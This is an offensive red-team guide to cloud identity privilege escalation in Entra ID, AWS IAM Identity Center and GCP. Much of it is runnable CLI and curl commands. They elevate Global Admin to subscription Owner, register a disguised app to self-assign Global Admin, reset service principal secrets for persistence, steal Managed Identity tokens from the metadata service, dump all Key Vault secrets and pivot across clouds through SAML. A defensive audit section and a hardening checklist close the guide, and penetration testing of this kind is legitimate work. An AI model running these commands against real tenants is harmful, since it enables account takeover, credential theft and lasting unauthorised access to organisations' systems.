# Cloud Identity Attack — Privilege Escalation Deep Dive

> Companion to `SKILL.md` and `payloads.md`. This guide covers cloud identity privilege escalation across Entra ID, AWS IAM Identity Center, GCP Cloud Identity, and cross-cloud federation. Topics: Global Admin elevation, role mapping abuse, Managed / Workload Identity theft, Service Principal abuse, and Key Vault enumeration.

---

## Overview

Cloud identity privilege escalation is rarely a single bug — it is a chain. The attacker starts with a low-priv user (read-only directory access), enumerates role assignments and service principals, identifies an over-privileged Service Principal or an exploitable role-assignment path, and pivots to Global Admin (Entra ID), root (AWS), or org admin (GCP). Cross-cloud federation (Azure → AWS via IAM Identity Center; Okta → AWS via SAML; Entra ID → GCP via Workload Identity Federation) extends the chain further.

This guide is structured as the offensive counterpart to defensive privilege-escalation guides. Each section includes hands-on Azure CLI / PowerShell / `aws` commands that you can run against a test tenant. The recurring lesson: cloud IAM is *role*-based, not *user*-based. A single misconfigured role assignment or a single compromised Service Principal can collapse the entire tenant.

---

## Entra ID Role Escalation (Global Admin → Root)

### Background

Entra ID has ~120 built-in directory roles. The most privileged are Global Administrator (GA), Privileged Role Administrator (PRA), and Application Administrator (AppAdmin). GA can do anything except reset PRA; PRA can manage roles including GA; AppAdmin can register backdoor apps.

The escalation pattern is:

1. **AppAdmin → GA**: Register an app with `RoleManagement.ReadWrite.Directory`, grant admin consent, then use the app to assign yourself GA.
2. **GA → PRT / on-prem**: GA can reset passwords of on-prem-synced accounts, including the on-prem AD `Administrator` account, achieving on-prem Domain Admin.
3. **GA → Azure subscription root**: GA can elevate to "User Access Administrator" on the Azure subscription via the `/elevateAccess` API.

### Hands-on: GA → Azure Root

```bash
# Elevate GA to User Access Administrator
az rest --method post \
    --url "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"

# Now you can assign any role at the subscription root
az role assignment create \
    --assignee <your-upn> \
    --role "Owner" \
    --scope "/subscriptions/<sub-id>"
```

### Hands-on: AppAdmin → GA

```bash
# Register app with RoleManagement.ReadWrite.Directory
az ad app create --display-name "legit-backup" \
    --required-resource-accesses '[{"resourceAppId":"00000003-0000-0000-c000-000000000000","resourceAccess":[{"id":"9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8","type":"Role"}]}]'

az ad sp create --id <app-id>
az ad app credential reset --id <app-id> --append
az ad app permission admin-consent --id <app-id>

# Acquire app token
curl -X POST https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token \
    -d "client_id=$APP_ID&client_secret=$SECRET&grant_type=client_credentials&scope=https://graph.microsoft.com/.default"

# Assign GA to yourself
az rest --method post \
    --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
    --body '{"principalId":"<your-id>","roleDefinitionId":"62e90394-69f5-4237-9190-012177145e10","directoryScopeId":"/"}'
```

---

## AWS IAM Identity Center Privilege Mapping

### Background

AWS IAM Identity Center (formerly AWS SSO) federates Entra ID / Okta / Ping via SAML. The federation trusts the IdP's SAML assertion, which contains a `Role` attribute with `RoleArn,PrincipalArn` pairs. The Identity Center then maps the IdP user to AWS permission sets.

If the attacker can forge or modify the SAML assertion (Golden SAML), they can inject arbitrary Role attributes. If they cannot forge, they may still abuse permission set misconfigurations: an over-broad permission set like `AdministratorAccess` granted to a broad group yields cross-account access.

### Hands-on: Enumerate IC Permission Sets

```bash
# After SSO login
aws sso-admin list-permission-sets --instance-arn <instance-arn>
aws sso-admin describe-permission-set \
    --instance-arn <instance-arn> \
    --permission-set-arn <ps-arn>

# Enumerate account assignments
aws sso-admin list-account-assignments \
    --instance-arn <instance-arn> \
    --account-id 111122223333
```

---

## GCP Cloud Identity Group Abuse

### Background

GCP Cloud Identity (the IdP layer of Google Workspace / Cloud Identity) organizes users into Groups. Groups are granted IAM roles on GCP projects, folders, and the organization. If an attacker can add themselves to a privileged group, they inherit all roles granted to that group.

### Hands-on: Enumerate and Join Groups

```bash
# List groups (requires cloudidentity.groups.read)
gcloud identity groups search --query="parent=='customers/<customer-id>'"

# List a group's members
gcloud identity groups memberships list --group=<group-email>

# Add yourself (requires Groups Admin)
gcloud identity groups memberships add \
    --group=<group-email> \
    --member-id=<your-email> \
    --roles=MEMBER
```

---

## Cross-Cloud Role Mapping (Azure → AWS via IC)

### Background

Cross-cloud federation enables a single compromise in one cloud to pivot to another. The most common pattern is Entra ID → AWS IAM Identity Center (via SAML), but Entra ID → GCP (via Workload Identity Federation) is increasingly common. The attacker compromises a high-priv Entra ID principal (e.g., a Service Principal with `AppRoleAssignment.ReadWrite.All`), then uses the federated trust to mint AWS STS credentials.

### Hands-on: Pivot Entra ID → AWS

```bash
# Acquire SAML assertion from Entra ID (via Graph)
ASSERTION=$(az rest --method get \
    --url "https://graph.microsoft.com/v1.0/applications/<aws-app-id>/samlTokens" \
    --query value -o tsv)

# Assume role
aws sts assume-role-with-saml \
    --role-arn "arn:aws:iam::111122223333:role/MyRole" \
    --principal-arn "arn:aws:iam::111122223333:saml-provider/EntraId" \
    --saml-assertion "$ASSERTION"
```

---

## Managed Identity / Workload Identity Theft

### Background

Managed Identity (Azure) and Workload Identity (GCP / Kubernetes) are identities assigned to compute resources. The IMDS (Instance Metadata Service) on an Azure VM exposes the Managed Identity token at `http://169.254.169.254/metadata/identity/oauth2/token`. If the attacker lands on the VM (via SSRF, RCE, or container escape), they can query IMDS for the token.

### Hands-on: Steal Managed Identity Token

```bash
# From the VM itself
curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"

# Use the token
curl -H "Authorization: Bearer $TOKEN" \
    https://graph.microsoft.com/v1.0/me
```

The same pattern applies to GCP Workload Identity (`http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`) and to Kubernetes service accounts (`/var/run/secrets/kubernetes.io/serviceaccount/token`).

---

## Service Principal Abuse (Password Reset, Cert Rotation)

### Background

Service Principals (SPs) are app identities in Entra ID. They authenticate via two mechanisms: client secrets (passwords) and client certificates. A compromised Application Administrator can reset the SP's secret or rotate its certificate, granting indefinite access to any tenant the SP is consented into.

### Hands-on: Reset SP Secret

```bash
# Reset the secret of a target SP
NEW_SECRET=$(az ad app credential reset --id <app-id> --append --query password -o tsv)

# Authenticate as the SP
TOKEN=$(curl -s -X POST https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token \
    -d "client_id=$APP_ID" \
    -d "client_secret=$NEW_SECRET" \
    -d "scope=https://graph.microsoft.com/.default" \
    -d "grant_type=client_credentials" | jq -r .access_token)

# Operate as the SP
curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/users
```

### Hands-on: Rotate SP Certificate

```bash
# Generate a self-signed cert
openssl req -x509 -newkey rsa:2048 -nodes \
    -keyout sp.key -out sp.crt -days 365 -subj "/CN=sp"

# Upload to the SP
az ad app credential reset --id <app-id> \
    --keyvault <kv-name> --cert <cert-name>
```

---

## Key Vault Secret Enumeration

### Background

Azure Key Vault is the cloud HSM / secret store. Access is gated by RBAC (`Key Vault Secrets User`, `Key Vault Secrets Officer`). A compromised principal with KV access can enumerate and dump secrets — often containing database credentials, API keys, and third-party SaaS tokens.

### Hands-on: Dump Key Vault Secrets

```bash
# Enumerate vaults
az keyvault list --query "[].name" -o tsv

# List secrets in a vault
az keyvault secret list --vault-name <vault-name> --query "[].name" -o tsv

# Read each secret
for SECRET in $(az keyvault secret list --vault-name <vault-name> --query "[].name" -o tsv); do
    az keyvault secret show --vault-name <vault-name> --name $SECRET --query value -o tsv
done
```

---

## Hands-on: Defensive Audit

Run the following to audit your tenant's escalation surface:

```bash
# Identify Global Admins
az rest --method get --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$filter=roleDefinitionId eq '62e90394-69f5-4237-9190-012177145e10'" --query "value[].principalId"

# Identify Service Principals with RoleManagement.ReadWrite.Directory
az rest --method get --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=displayName,appId,appRoles"
```

---

## References

1. Microsoft — Entra ID built-in roles — https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference
2. Microsoft — Privileged Identity Management (PIM) — https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/
3. Microsoft — Azure elevate access — https://learn.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin
4. AWS — IAM Identity Center permission sets — https://docs.aws.amazon.com/singlesignon/latest/userguide/permissionsetsconcept.html
5. AWS — STS assume-role-with-saml — https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithSAML.html
6. GCP — Cloud Identity groups — https://cloud.google.com/identity/docs/groups
7. GCP — Workload Identity Federation — https://cloud.google.com/iam/docs/workload-identity-federation
8. Microsoft — Managed Identities — https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/
9. Microsoft — Azure Instance Metadata Service — https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service
10. Microsoft — Key Vault RBAC — https://learn.microsoft.com/en-us/azure/key-vault/general/rbac-guide
11. Mandiant — Cross-cloud attack research — https://www.mandiant.com/resources/blog/cross-cloud-attack-chains
12. Rhino Security Labs — Pacu / cloud escalation — https://github.com/RhinoSecurityLabs/pacu
13. Spartacus — Entra ID escalation — https://github.com/Spartacus-Corporation/Spartacus
14. Microsoft Threat Intelligence — Solorigate / NOBELIUM escalation chains — https://www.microsoft.com/en-us/security/blog/2021/01/solorigate-escalation/

---

## Appendix: Escalation Path Enumeration Cheatsheet

When landing in an unfamiliar Entra ID tenant as a low-priv user, run the following commands to enumerate escalation paths. Each command targets a distinct privilege boundary.

### 1. Self-Service Role Eligibility (PIM)

```bash
# Enumerate your PIM eligibility
USER_ID=$(az ad signed-in-user show --query id -o tsv)
az rest --method get --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilitySchedules?\$filter=principalId eq '$USER_ID'"
```

If any role has self-activation enabled (no approver), it is a candidate for the engagement's escalation path.

### 2. Application Registrations You Can Modify

```bash
# Apps where you are an owner (can add credentials)
az ad app list --filter "owners/<your-id>" --query "[].{name:displayName, id:appId}" -o table

# Service principals with appRoles assigned to your user
az rest --method get --url "https://graph.microsoft.com/v1.0/users/<your-id>/appRoleAssignments"
```

If you own an app with `RoleManagement.ReadWrite.Directory`, you can self-escalate to GA via client credentials.

### 3. Conditional Access Policy Gaps

```bash
# List CA policies; look for "excludedUsers" containing your account
az rest --method get --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies"
```

### 4. Key Vault Access via SP

```bash
# For each SP you can authenticate as, list its Key Vault RBAC
az role assignment list --assignee <sp-id> --scope "/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<kv>" --all
```

### 5. Cross-Tenant Lateral Pivot

```bash
# Enumerate tenants where your SP has appRoleAssignments
az rest --method get --url "https://graph.microsoft.com/v1.0/servicePrincipals/<sp-id>/appRoleAssignmentsTo"
```

---

## Defensive Hardening Checklist

For blue-team handoff, the report should include:

- [ ] Enforce PIM with approval for all privileged roles.
- [ ] Restrict Application Administrator and Cloud Application Administrator to break-glass accounts.
- [ ] Require admin consent for all new app registrations.
- [ ] Block user consent for non-verified publishers.
- [ ] Restrict `RoleManagement.ReadWrite.Directory` to PRA-only.
- [ ] Enable Microsoft Defender for Cloud Apps — OAuth app anomaly detection.
- [ ] Enforce managed identity for compute; block long-lived SP secrets where possible.
- [ ] Audit Key Vault access weekly; alert on bulk secret reads.
- [ ] Restrict AWS IC permission sets to least privilege; review SAML `Role` attribute on schedule.
- [ ] Subscribe to Mandiant and Microsoft Threat Intelligence for active privilege-escalation campaigns.

---

## Common Mistakes and Engagement Pitfalls

1. **Assuming MFA blocks escalation**: Most escalation paths (PIM self-activation, SP secret reset, Managed Identity token theft) do not require MFA bypass — they operate on existing authenticated sessions. MFA is necessary but not sufficient.
2. **Ignoring cross-cloud**: A perfectly hardened Entra ID tenant may be compromised via AWS IC federation. Map the federation graph before scoping the engagement.
3. **Forgetting service principals**: SPs outnumber users in most tenants. Many engagements focus on user accounts and miss SP-owned persistence.
4. **Underestimating Key Vault**: KV access often yields more secrets than full directory enumeration. Always check KV as a step.
5. **Not documenting cleanup**: Privilege-escalation activities leave audit log entries (role assignments, app registrations, SP secret resets). Document each in the engagement report so defenders can verify rollback.
